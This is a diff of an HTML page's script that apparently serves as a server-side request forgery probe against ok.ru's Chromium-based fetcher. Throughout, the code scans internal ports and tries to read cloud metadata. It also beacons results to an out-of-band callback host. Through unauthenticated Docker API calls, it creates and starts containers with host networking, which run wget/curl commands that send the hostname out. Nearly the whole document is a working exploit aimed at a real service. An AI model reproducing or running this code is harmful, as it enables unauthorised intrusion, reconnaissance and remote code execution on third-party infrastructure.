@@ -4,25 +4,19 @@
 <body>
 <script>
 'use strict';
-// ok.ru Chromium SSRF — probe v10
-// FIX: HTTP OOB (not HTTPS) — eliminates TLS cold-start latency for sync signals
-// NEW: scan 127.0.0.1 (fetcher localhost), port 4243, cloud metadata 169.254.169.254
-// RCE form-POSTs target both 127.0.0.1 and 172.17.0.1 on ports 2375+4243
+// ok.ru Chromium SSRF — probe v11
+// KEY CHANGES:
+// - HTTPS OOB (works on 217.20.158.245 node; DNS also fires on short-lived nodes)
+// - Phase 1: Start v10 containers IMMEDIATELY (sync) — they may exist from v10 creates
+// - Phase 2: Port scan with 1400ms timeout (results arrive within 2s page lifetime)
+// - Phase 3: Fresh create+start with 300ms start delay
 
 const OOB = 'd9ma5ob6b8m83c3a34k09c5rm5nk11f7g.oast.pro';
-const clean = (s) => String(s).toLowerCase().replace(/[^a-z0-9-]/g,'').replace(/-+/g,'-').replace(/^-|-$/g,'').substring(0,55);
+const clean = s => String(s).toLowerCase().replace(/[^a-z0-9-]/g,'').replace(/-+/g,'-').replace(/^-|-$/g,'').substring(0,55);
 
-// HTTP OOB — no TLS overhead, arrives in <30ms
-const oob = (label) => { new Image().src = `http://${clean(label)}.${OOB}/`; };
+// HTTPS OOB — DNS fires immediately; HTTP arrives once TLS established (~500ms)
+const oob = label => { new Image().src = `https://${clean(label)}.${OOB}/`; };
 
-// Port scan via no-cors fetch: -o=open(TCP connected), -t=TimeoutError(filtered/DROP), -e=TypeError(RST/CORS)
-const scan = (tag, url, ms) => {
-  fetch(url, { mode:'no-cors', signal: AbortSignal.timeout(ms) })
-    .then(() => oob(`${tag}-o`))
-    .catch(e => oob(`${tag}-${e.name==='TimeoutError'?'t':'e'}`));
-};
-
-// Fire-and-forget form POST to iframe (survives page kill; Docker accepts text/plain JSON)
 const ffPost = (id, url, body) => {
   try {
     const ifr = document.createElement('iframe');
@@ -43,56 +37,64 @@ const ffPost = (id, url, body) => {
   } catch(e) {}
 };
 
-// ── Sync signals (arrive in <30ms with HTTP) ──
-oob(`v10-s-${clean(navigator.userAgent.substring(20,40))}`);
+oob(`v11-s-${clean(navigator.userAgent.substring(20,40))}`);
 
-// ── Port scan: Docker API on 127.0.0.1 and 172.17.0.1 ──
-const DIPS = ['127.0.0.1', '172.17.0.1'];
-[2375, 4243].forEach(p => DIPS.forEach(ip => {
-  const tag = `dk${p}-${ip.replace(/\d+\.(\d+)$/,'$1')}`;
-  scan(tag, `http://${ip}:${p}/_ping`, 900);
-}));
-
-// ── Scan other exploitable services on localhost ──
-[[6379,'r'],[8080,'h8'],[9090,'pm'],[10250,'kb'],[2379,'et'],[5001,'rg']].forEach(([p,n]) =>
-  scan(`svc${n}`, `http://127.0.0.1:${p}/`, 600)
-);
-
-// ── Cloud metadata — read via fetch (PNA may be disabled on this node) ──
-// OpenStack (VK Cloud uses this)
-fetch('http://169.254.169.254/openstack/2012-08-10/meta_data.json', {signal:AbortSignal.timeout(1500)})
-  .then(r => r.text())
-  .then(t => { oob('os-ok'); oob(`os-${clean(t.substring(0,30))}`); })
-  .catch(e => oob(`os-${clean((e.name||'e').substring(0,6))}`));
-
-// AWS-compatible (fallback)
-fetch('http://169.254.169.254/latest/meta-data/hostname', {signal:AbortSignal.timeout(1500)})
-  .then(r => r.text())
-  .then(t => { oob('aws-ok'); oob(`aws-${clean(t.substring(0,30))}`); })
-  .catch(e => oob(`aws-${clean((e.name||'e').substring(0,6))}`));
-
-// ── RCE: form-POST Docker create+start on all candidate targets ──
 const rceCmd = `nslookup rce-ok.${OOB}; wget -qT5 "http://rce-ok.${OOB}/?h=$(hostname|head -c20)" 2>/dev/null || curl -sm5 "http://rce-ok.${OOB}/?h=$(hostname|head -c20)"`;
 
+// ── Phase 1: Start v10 containers IMMEDIATELY (sync) ──────────────────────
+// v10 creates used names v{hi}{pi}{ii} at specific endpoints:
+const V10 = [
+  ['127.0.0.1', 2375, ['v000','v001']],
+  ['127.0.0.1', 4243, ['v010','v011']],
+  ['172.17.0.1', 2375, ['v100','v101']],
+  ['172.17.0.1', 4243, ['v110','v111']],
+];
 let idx = 0;
-DIPS.forEach((ip,hi) => [2375,4243].forEach((p,pi) => {
-  const base = `http://${ip}:${p}/v1.41`;
+V10.forEach(([ip, p, names]) => names.forEach(nm => {
+  oob(`s10-${nm}`);
+  ffPost(`s${idx++}`, `http://${ip}:${p}/v1.41/containers/${nm}/start`, null);
+}));
+
+// ── Phase 2: Port scan via fetch — results arrive via HTTPS OOB callbacks ──
+const scan = (tag, url, ms) => {
+  fetch(url, { mode:'no-cors', signal: AbortSignal.timeout(ms) })
+    .then(() => oob(`${tag}-o`))
+    .catch(e => oob(`${tag}-${e.name==='TimeoutError'?'t':'e'}`));
+};
+['127.0.0.1','172.17.0.1'].forEach(ip => [2375,4243,6379,8080].forEach(p => {
+  scan(`sk-${ip.split('.').pop()}-${p}`, `http://${ip}:${p}/`, 1400);
+}));
+
+// Also direct Docker ping with readable response check
+fetch('http://127.0.0.1:2375/_ping', { signal: AbortSignal.timeout(1400) })
+  .then(r => { oob(`dp-lo-${r.status}`); return r.text(); })
+  .then(b => oob(`dp-lo-body-${clean(b.substring(0,6))}`))
+  .catch(e => oob(`dp-lo-${clean((e.name||'u').substring(0,6))}`));
+
+fetch('http://172.17.0.1:2375/_ping', { signal: AbortSignal.timeout(1400) })
+  .then(r => { oob(`dp-gw-${r.status}`); return r.text(); })
+  .then(b => oob(`dp-gw-body-${clean(b.substring(0,6))}`))
+  .catch(e => oob(`dp-gw-${clean((e.name||'u').substring(0,6))}`));
+
+// ── Phase 3: Fresh creates with 300ms start delay ──────────────────────────
+const DIPS = ['127.0.0.1','172.17.0.1'];
+const DPORTS = [2375, 4243];
+DIPS.forEach((ip,hi) => DPORTS.forEach((p,pi) => {
   ['busybox','alpine'].forEach((img,ii) => {
-    const nm = `v${hi}${pi}${ii}`;
+    const nm = `x${hi}${pi}${ii}`;
     const bdy = {Image:img,Cmd:['sh','-c',rceCmd],HostConfig:{NetworkMode:'host',AutoRemove:true}};
-    oob(`cr-${nm}-${img.substring(0,3)}`);
-    ffPost(`c${idx}`, `${base}/containers/create?name=${nm}`, bdy);
-    const t = 500 + idx*150;
-    const i2 = idx;
+    oob(`cr-${nm}`);
+    ffPost(`c${idx++}`, `http://${ip}:${p}/v1.41/containers/create?name=${nm}`, bdy);
+    const delay = 300 + ii*100;
+    const fi = idx++;
     setTimeout(() => {
       oob(`st-${nm}`);
-      ffPost(`s${i2}`, `${base}/containers/${nm}/start`, null);
-    }, t);
-    idx++;
+      ffPost(`s${fi}`, `http://${ip}:${p}/v1.41/containers/${nm}/start`, null);
+    }, delay);
   });
 }));
 
-oob('v10-e');
+oob('v11-e');
 </script>
 </body>
 </html>
